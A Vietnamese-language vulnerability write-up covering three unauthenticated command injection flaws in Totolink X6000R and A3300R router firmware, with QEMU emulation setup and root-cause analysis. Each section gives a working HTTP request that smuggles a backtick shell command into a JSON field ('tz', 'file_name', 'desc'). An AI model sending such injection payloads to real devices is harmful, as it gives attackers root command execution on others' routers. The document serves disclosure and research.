# Phân Tích Lỗ Hổng Command Injection [CVE-2025-52284](https://www.tenable.com/cve/CVE-2025-52284) Trên Totolink X6000R



## Giới Thiệu

Trong bài viết này, tôi sẽ chia sẻ về quá trình phát hiện và khai thác lỗ hổng Command Injection CVE-2025-52284 trên thiết bị router Totolink X6000R phiên bản V9.4.0cu.1360_B20241207. Đây là một lỗ hổng nghiêm trọng cho phép kẻ tấn công không cần xác thực có thể thực thi các lệnh tùy ý trên thiết bị thông qua tham số `tz` trong chức năng `setNtpCfg`.

## Thông Tin Lỗ Hổng

- **CVE ID**: CVE-2025-52284
- **Thiết bị ảnh hưởng**: Totolink X6000R 
- **Phiên bản firmware**: V9.4.0cu.1360_B20241207
- **Loại lỗ hổng**: Command Injection
- **Mức độ nghiêm trọng**: Cao (không cần xác thực)
- **Phát hiện bởi**: dtro và datnlq từ VietSunshine Cyber Security Services

## Thiết Lập Môi Trường Lab

Vì không có thiết bị thực tế, tôi đã tiến hành ảo hóa firmware để phục vụ cho việc nghiên cứu. Dưới đây là các bước chi tiết:

### 1. Extract Firmware

```bash
# Download và extract firmware
binwalk -e TOTOLINK_C8380R_X6000R_IP04499_MT7981_SPI_16M256M_V9.4.0cu.1360_B20241207_ALL.web

# Kiểm tra kiến trúc
file squashfs-root/bin/*
# Output: ELF 64-bit LSB executable, ARM aarch64...
```

### 2. Tạo Rootfs

```bash
# Đóng gói squashfs-root thành rootfs
tar -czf rootfs.tar.gz squashfs-root
```

### 3. Chuẩn Bị Scripts Hỗ Trợ

**mount_chroot.sh** - Script để mount các thư mục hệ thống cần thiết:
```bash
#!/bin/sh
mkdir var/run
sudo mount -o bind /proc proc/
sudo mount -o bind /dev dev/
sudo mount -o bind /sys sys/
sudo chroot . /bin/sh
```

**runservice.sh** - Script khởi động web service:
```bash
#!/bin/sh
./usr/sbin/shttpd -ports 8080 -root ./web
```

### 4. Thiết Lập QEMU Emulator

**emulator.sh** - Script tự động hóa việc cài đặt và chạy QEMU:
```bash
#!/bin/bash

# Cài đặt QEMU cho kiến trúc aarch64
sudo apt-get update
sudo apt-get install qemu-system-aarch64 cloud-image-utils -y

# Tạo user-data cho cloud-init
user_data="user-data.img"
if [ ! -f "$user_data" ]; then
cat > user-data <<EOF
#cloud-config
password: asdfqwer
chpasswd: { expire: False }
ssh_pwauth: True
EOF

cloud-localds "$user_data" user-data
fi

# Tải Ubuntu ARM64 image
img="ubuntu-18.04-server-cloudimg-arm64.img"
if [ ! -f "$img" ]; then
    wget "https://cloud-images.ubuntu.com/releases/18.04/release/${img}" --no-check-certificate
fi

# Tải UEFI firmware
if [ ! -f "QEMU_EFI.fd" ]; then
    wget https://releases.linaro.org/components/kernel/uefi-linaro/16.02/release/qemu64/QEMU_EFI.fd --no-check-certificate
fi

# Khởi chạy QEMU với port forwarding
sudo qemu-system-aarch64 \
    -m 2048 \
    -cpu cortex-a72 \
    -smp 4 \
    -M virt \
    -nographic \
    -bios QEMU_EFI.fd \
    -drive if=none,file="${img}",id=hd0 \
    -device virtio-blk-device,drive=hd0 \
    -drive file="${user_data}",format=raw \
    -device virtio-net-device,netdev=net0 \
    -netdev user,id=net0,hostfwd=tcp::8080-:8080,hostfwd=tcp::2222-:22
```

### 5. Deploy và Chạy Service

```bash
# Copy files vào máy ảo
scp -P2222 ./rootfs.tar.gz ubuntu@127.0.0.1:/tmp
scp -P2222 ./mount_chroot.sh ubuntu@127.0.0.1:/tmp
scp -P2222 ./runservice.sh ubuntu@127.0.0.1:/tmp

# Trong máy ảo
sudo mkdir /home/X6000R
sudo chown ubuntu:ubuntu /home/X6000R
cd /home/X6000R
tar -xf /tmp/rootfs.tar.gz
cd squashfs-root
mv /tmp/*.sh .
chmod +x *.sh

# Chroot và chạy service
./mount_chroot.sh
./runservice.sh
```

## Troubleshooting - Các Lỗi Thường Gặp Khi Setup

### 1. Firmware Không Có Web Interface

**Vấn đề**: Sau khi extract firmware, không tìm thấy thư mục `/web` hoặc `/www`

**Giải pháp**:
```bash
# Tìm kiếm các file HTML/JS trong toàn bộ firmware
find squashfs-root -name "*.html" -o -name "*.js" -o -name "*.cgi"

# Kiểm tra các symlink
ls -la squashfs-root/www
ls -la squashfs-root/web

# Một số firmware lưu web files ở vị trí khác
find squashfs-root -type d -name "*www*" -o -name "*web*"
```

**Workaround**: Nếu thực sự không có web interface, có thể:
- Extract từ phiên bản firmware khác của cùng dòng sản phẩm
- Tạo minimal web interface chỉ với endpoint cần test

### 2. Kiến Trúc Không Phải ARM

**Vấn đề**: Firmware chạy trên MIPS, PowerPC, hoặc kiến trúc khác

**Giải pháp cho MIPS**:
```bash
# Cài đặt QEMU cho MIPS
sudo apt-get install qemu-system-mips

# Sử dụng buildroot hoặc OpenWrt image cho MIPS
# Điều chỉnh script emulator phù hợp
```

**Giải pháp chung**:
```bash
# Xác định chính xác kiến trúc
file squashfs-root/bin/busybox
readelf -h squashfs-root/bin/busybox

# Sử dụng QEMU user mode cho testing đơn giản
qemu-mips-static ./binary
qemu-mipsel-static ./binary  # cho little endian
```

### 3. QEMU Setup Errors

**Lỗi: "qemu-system-aarch64: -bios QEMU_EFI.fd: Could not open"**

```bash
# Download UEFI từ nguồn khác
wget http://snapshots.linaro.org/components/kernel/leg-virt-tianocore-edk2-upstream/latest/QEMU-AARCH64/RELEASE_GCC5/QEMU_EFI.fd

# Hoặc sử dụng package manager
sudo apt-get install qemu-efi-aarch64
cp /usr/share/qemu-efi-aarch64/QEMU_EFI.fd .
```

**Lỗi: "Failed to load firmware"**

```bash
# Kiểm tra permission
ls -la QEMU_EFI.fd
chmod 644 QEMU_EFI.fd

# Thử boot không dùng UEFI
# Bỏ dòng -bios và thêm kernel trực tiếp
```

### 4. Web Service Khác Nhau

**Xác định web server đang dùng**:
```bash
# Tìm binary web server
find squashfs-root -name "*httpd*" -type f -executable
strings squashfs-root/usr/sbin/*httpd | grep -i "server:"

# Common web servers trong embedded devices:
# - lighttpd
# - mini_httpd
# - uhttpd (OpenWrt)
# - boa
# - shttpd/thttpd
```

**Cấu hình cho lighttpd**:
```bash
# runservice.sh cho lighttpd
#!/bin/sh
mkdir -p /var/log/lighttpd
touch /var/log/lighttpd/error.log
/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D
```

**Cấu hình cho uhttpd**:
```bash
# runservice.sh cho uhttpd
#!/bin/sh
/usr/sbin/uhttpd -f -h /www -p 0.0.0.0:8080
```

### 5. Dependency Issues

**Lỗi: "error while loading shared libraries"**

```bash
# Kiểm tra dependencies
ldd squashfs-root/usr/sbin/shttpd

# Copy libraries còn thiếu
cp /lib/aarch64-linux-gnu/libc.so.6 squashfs-root/lib/

# Hoặc cài đặt trong chroot
apt-get install libc6:arm64
```

### 6. Chroot Environment Issues

**Lỗi: "chroot: failed to run command '/bin/sh'"**

```bash
# Kiểm tra shell tồn tại
ls -la squashfs-root/bin/sh

# Nếu là symlink đến busybox
ls -la squashfs-root/bin/busybox

# Fix permission
chmod +x squashfs-root/bin/busybox
```

### 7. Network Configuration

**Service chạy nhưng không thể kết nối**:

```bash
# Trong QEMU guest
netstat -tlnp | grep 8080
iptables -L -n

# Điều chỉnh firewall nếu cần
iptables -F
iptables -P INPUT ACCEPT

# Kiểm tra binding address trong config
# Đảm bảo bind vào 0.0.0.0 không phải 127.0.0.1
```

### 8. Lỗi Loop Khi Load Web Interface

**Vấn đề**: Trang web reload liên tục hoặc redirect vô hạn

**Nguyên nhân phổ biến**:

1. **Session/Cookie Issues**:
```bash
# Tạo thư mục session nếu thiếu
mkdir -p squashfs-root/var/lib/php/sessions
mkdir -p squashfs-root/tmp
chmod 777 squashfs-root/tmp
```

2. **CGI Configuration**:
```bash
# Kiểm tra CGI scripts
ls -la squashfs-root/www/cgi-bin/
chmod +x squashfs-root/www/cgi-bin/*.cgi

# Test CGI trực tiếp
chroot squashfs-root /www/cgi-bin/cstecgi.cgi
```

### 9. Alternative Emulation Methods

Nếu QEMU quá phức tạp, có thể thử:

**1. FirmAE (Firmware Analysis and Emulation)**:
```bash
git clone https://github.com/pr0v3rbs/FirmAE
cd FirmAE
./run.sh -r Totolink ./firmware.bin
```

**2. QEMU User Mode**:
```bash
# Cho single binary testing
cp /usr/bin/qemu-aarch64-static squashfs-root/
chroot squashfs-root ./qemu-aarch64-static /usr/sbin/shttpd
```

**3. Docker với QEMU**:
```bash
# Sử dụng multiarch Docker
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
docker run -it -p 8080:8080 arm64v8/ubuntu:18.04
```

## Phân Tích Lỗ Hổng

### 1. Luồng Xử Lý Dữ Liệu

Lỗ hổng nằm trong chức năng `setNtpCfg` xử lý cấu hình NTP (Network Time Protocol) của thiết bị:

1. **Binary shttp**: Hàm `sub_4184C0` nhận tham số `tz` (timezone) từ request HTTP
![image.png](CVE-2025-52284/setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image.png)


2. Giá trị này được truyền vào `Uci_Set_Str` để lưu vào cấu hình UCI

![image.png](CVE-2025-52284/setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%201.png)

3. Sau đó gọi hàm `set_timezone_to_kernel` trong `libcscommon.so`

![image.png](CVE-2025-52284/setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%202.png)

4. **Binary libcscommon.so**: Hàm `set_timezone_to_kernel`:
   - Đọc lại giá trị timezone từ UCI bằng `uci_get_str`
   - Truyền trực tiếp vào `do_system` mà không có validation


**Request**

```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.210.133:8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 128

{"tz":"UTC+9`ls>/web/cmd1.txt`","enable":"1","server":"pool.ntp.org*cn.pool.ntp.org*europe.pool.ntp.org","topicurl":"setNtpCfg"}
```

**Response**

```python
HTTP/1.0 200 OK
Server: SHTTPD 
Date: Tue, 10 Jun 2025 07:26:12 GMT
X-UA-Compatible: IE=edge
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: -1
Content-Type: application/json
Connection: close

{ "success": true, "error": "", "lan_ip": "", "wtime": "", "reserv": "reserv" }
```

**PoC**

![image.png](CVE-2025-52284/setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%203.png)

![image.png](CVE-2025-52284/setNtpCfg%2020e8aff2dc8b80a3afafef36b48f7496/image%204.png)



### 2. Root Cause

Vấn đề cốt lõi là giá trị timezone từ người dùng được truyền trực tiếp vào hàm `do_system` (tương đương `system()` trong C) mà không qua bất kỳ kiểm tra hay lọc nào. Điều này cho phép injection các command shell thông qua ký tự backtick (`) hoặc các ký tự đặc biệt khác.

### 3. Khai Thác

**Request khai thác:**
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.210.133:8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 128

{"tz":"UTC+9`ls>/web/cmd1.txt`","enable":"1","server":"pool.ntp.org","topicurl":"setNtpCfg"}
```

**Giải thích payload:**
- `UTC+9`: Giá trị timezone hợp lệ
- `` `ls>/web/cmd1.txt` ``: Command injection - liệt kê thư mục và ghi vào file
- Lệnh được thực thi với quyền của web service (thường là root)

**Response:**
```json
{ "success": true, "error": "", "lan_ip": "", "wtime": "", "reserv": "reserv" }
```

### 4. Proof of Concept

Sau khi gửi request, kiểm tra file `/web/cmd1.txt` sẽ thấy output của lệnh `ls`, chứng minh command đã được thực thi thành công.


## Kết Luận

CVE-2025-52284 là một ví dụ điển hình về lỗi Command Injection do thiếu validation đầu vào. Với khả năng khai thác không cần xác thực và impact cao (RCE với quyền root), đây là lỗ hổng nghiêm trọng cần được vá ngay lập tức.

Việc setup lab ảo hóa tuy phức tạp nhưng là giải pháp hiệu quả khi không có thiết bị thực. Hy vọng bài viết này giúp ích cho cộng đồng security research trong việc tìm hiểu và phòng chống các lỗ hổng tương tự.


# Phân Tích Lỗ Hổng Command Injection CVE-2025-52053 Trên Totolink X6000R

## Giới Thiệu

CVE-2025-52053 là một lỗ hổng Command Injection được phát hiện trong thiết bị router Totolink X6000R phiên bản V9.4.0cu.1360_B20241207. Lỗ hổng này nằm trong chức năng `UploadFirmwareFile` và cho phép kẻ tấn công không cần xác thực có thể thực thi các lệnh tùy ý trên thiết bị.

## Thông Tin Lỗ Hổng

- **CVE ID**: CVE-2025-52053
- **Thiết bị ảnh hưởng**: Totolink X6000R
- **Phiên bản firmware**: V9.4.0cu.1360_B20241207
- **Loại lỗ hổng**: Command Injection
- **Hàm bị ảnh hưởng**: `sub_417D74` (trong binary `shttp`)
- **Tham số khai thác**: `file_name`
- **Mức độ nghiêm trọng**: Cao (không cần xác thực)
- **Author**: Cao (không cần xác thực)
- **Link tải firmware**: [https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar](https://www.totolink.net/data/upload/20250328/7a1a804767bc5b1196c480f62c40a20e.rar)
- **Phát hiện bởi**: Hao Ngo, Tin Pham aka TF1T


## Phân Tích Chi Tiết

### 1. Luồng Xử Lý Dữ Liệu

Lỗ hổng xảy ra trong quá trình xử lý upload firmware:

1. **Binary shttp**: Hàm `sub_417D74` nhận tham số `file_name` từ request HTTP và truyền nó vào hàm `firmware_check`

![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image.png)

2. **Binary libcscommon.so**: Hàm `firmware_check` truyền giá trị `a1` (chứa `file_name`) trực tiếp vào hàm `do_system` để thực thi lệnh mà không có bất kỳ validation nào

![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%201.png)

### 2. Khai Thác

**Request khai thác:**
```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.210.133:8080
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 106

{"file_name": "1`ls>/web/cmd3.txt`","content_length":"100","topicurl":"UploadFirmwareFile","token":"1234"}
```

**Response:**
```python
HTTP/1.0 200 OK
Server: SHTTPD 
Date: Tue, 10 Jun 2025 08:06:42 GMT
X-UA-Compatible: IE=edge
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: -1
Content-Type: application/json
Connection: close

{
	"upgradeERR":	"MM_cloud_fw2flash1"
}
```

### 3. Proof of Concept

Sau khi gửi request với payload chứa command injection, lệnh được thực thi thành công:

![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%202.png)

Kết quả file `/web/cmd3.txt` được tạo với nội dung là output của lệnh `ls`:

![image.png](CVE-2025-52053/UploadFirmwareFile%2020e8aff2dc8b80b09ab3ea5a78181699/image%203.png)

### 4. Root Cause

Vấn đề cốt lõi là tham số `file_name` được truyền trực tiếp vào hàm `do_system` mà không qua bất kỳ kiểm tra hay lọc nào. Điều này cho phép attacker inject các command shell thông qua ký tự backtick (`) hoặc các ký tự đặc biệt khác.

---

# Phân Tích Lỗ Hổng Command Injection CVE-2025-52046 Trên Totolink A3300R

## Giới Thiệu

CVE-2025-52046 là một lỗ hổng Command Injection nghiêm trọng được phát hiện trong router Totolink A3300R phiên bản mới nhất V17.0.0cu.596_B20250515. Lỗ hổng này nằm trong chức năng `setWiFiAclRules` và cho phép kẻ tấn công thực thi lệnh tùy ý mà không cần xác thực.

## Thông Tin Lỗ Hổng

- **CVE ID**: CVE-2025-52046
- **Thiết bị ảnh hưởng**: Totolink A3300R
- **Phiên bản firmware**: V17.0.0cu.596_B20250515
- **Loại lỗ hổng**: Command Injection
- **Hàm bị ảnh hưởng**: `sub_4197C0` (trong binary `shttp`)
- **Tham số khai thác**: `mac`, `desc`
- **Mức độ nghiêm trọng**: Cao (không cần xác thực)
- **Link tải firmware**: [https://www.totolink.net/data/upload/20250515/8c0a04842e9e10188d0822b7b19cf212.web](https://www.totolink.net/data/upload/20250515/8c0a04842e9e10188d0822b7b19cf212.web)
- **Phát hiện bởi**: Hiw0rl4 và Phl từ VietSunshine Cyber Security Services

## Phân Tích Chi Tiết

### 1. Luồng Xử Lý Dữ Liệu

Lỗ hổng xảy ra trong quá trình xử lý cấu hình WiFi Access Control List:

1. **Binary shttp**: Hàm `sub_4197C0` nhận các tham số `mac` và `desc` từ request HTTP, sử dụng `snprintf` để ghép hai tham số này thành một chuỗi, sau đó truyền chuỗi kết quả vào hàm `wificonf_add_by_key`

![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image.png)

2. **Binary libcscommon.so**: Hàm `wificonf_add_by_key` truyền giá trị `a3` vào `v12`, sau đó gọi hàm `csteSystem()` để thực thi lệnh

![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%201.png)

### 2. Khai Thác

**Request khai thác:**
```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.1.4:1380
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 127
Origin: http://192.168.1.4:1380
Connection: keep-alive
Referer: http://192.168.1.4:1380/login.html
X-PwnFox-Color: blue
Priority: u=0

{"mac":"14:16:9E:CC:BB:3F","desc":"hihihohohaha`ls>/web/cmdi2.txt`","addEffect":"1","wifiIdx":"0","topicurl":"setWiFiAclRules"}
```

**Response:**
```python
HTTP/1.0 200 OK
Server: SHTTPD 1.42
Date: Wed, 11 Jun 2025 15:47:38 GMT
X-UA-Compatible: IE=edge
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Expires: -1
Content-Type: application/json
Connection: close

{ "success": true, "error": "", "lan_ip": "", "wtime": "5", "reserv": "reserv" }
```

### 3. Proof of Concept

Sau khi gửi request với payload chứa command injection trong tham số `desc`, lệnh được thực thi thành công:

![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%202.png)

Kết quả file `/web/cmdi2.txt` được tạo với nội dung là output của lệnh `ls`:

![image.png](CVE-2025-52046/setWiFiAclRules%20(A3300R)%202108aff2dc8b80348d94e7fd1378d475/image%203.png)

### 4. Root Cause

Vấn đề xảy ra do:
- Tham số `desc` (mô tả) được ghép với tham số `mac` thông qua `snprintf`
- Chuỗi kết quả được truyền trực tiếp vào hàm `csteSystem()` mà không có validation
- Attacker có thể inject command thông qua ký tự backtick (`) trong tham số `desc`

## Kết Luận

Cả hai lỗ hổng CVE-2025-52053 và CVE-2025-52046 đều là những ví dụ điển hình về lỗi Command Injection do thiếu validation đầu vào. Với khả năng khai thác không cần xác thực và cho phép thực thi lệnh với quyền cao, đây là những lỗ hổng nghiêm trọng cần được vá ngay lập tức. Người dùng các thiết bị Totolink X6000R và A3300R nên cập nhật firmware mới nhất hoặc áp dụng các biện pháp bảo vệ như hạn chế truy cập vào giao diện quản trị từ Internet.


## Tham Khảo

- [Totolink Official Website](https://www.totolink.net/)
- [phieulang emu](https://github.com/phieulang1993/emu/tree/master/emu_arm)
- OWASP Command Injection Prevention Cheat Sheet
- QEMU Documentation for ARM64 Architecture

